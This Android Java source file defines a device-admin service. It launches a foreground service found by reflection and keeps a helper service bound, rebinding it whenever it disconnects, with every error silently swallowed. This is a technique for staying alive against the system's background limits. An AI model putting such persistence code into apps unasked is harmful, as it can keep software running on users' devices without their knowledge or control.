package background.work.around;

import android.app.*;
import android.os.storage.*;
import java.util.*;
import android.app.admin.*;
import android.content.*;
import android.content.pm.*;
import android.os.*;

public final class WatcherService extends DeviceAdminService {
	            
	private void BindHelper() {		
            try {
			new Thread(() -> {
			   try {
                   Context appContext = getApplicationContext();
                   Intent serviceIntent = new Intent(appContext, background.work.around.HelperService.class);

                   appContext.bindService(serviceIntent, new ServiceConnection() {
                       @Override
                       public void onServiceConnected(ComponentName name, IBinder service) {                       
                    
                       }

                       @Override
                       public void onServiceDisconnected(ComponentName name) {                        
                       BindHelper(); 
                       }
                   }, Context.BIND_AUTO_CREATE | Context.BIND_IMPORTANT | Context.BIND_ABOVE_CLIENT);
               } catch (Throwable BindError) {}
			}).start();
            } catch (Throwable ThreadStartError) {}        
	}
    
      @Override
    public void onCreate() {
        super.onCreate();		
		BindHelper();
		try {
        Class<?> serviceClass = Class.forName("background.work.around.RiderService");
        Intent serviceIntent = new Intent(this, serviceClass);
        startForegroundService(serviceIntent);
       } catch (Throwable t) {}	}


}
